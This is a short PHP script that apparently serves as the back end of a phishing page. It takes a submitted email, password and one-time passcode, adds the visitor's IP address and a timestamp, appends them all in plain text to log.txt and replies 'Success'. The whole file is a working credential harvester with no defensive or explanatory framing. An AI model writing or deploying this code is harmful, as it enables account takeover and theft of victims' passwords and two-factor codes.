<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $otp = $_POST['otp'] ?? 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');

    $log = "Time: $time | IP: $ip\n";
    $log .= "User: $email | Pass: $password | OTP: $otp\n";
    $log .= "------------------------------------------\n";

    file_put_contents("log.txt", $log, FILE_APPEND);
    echo "Success";
}
?>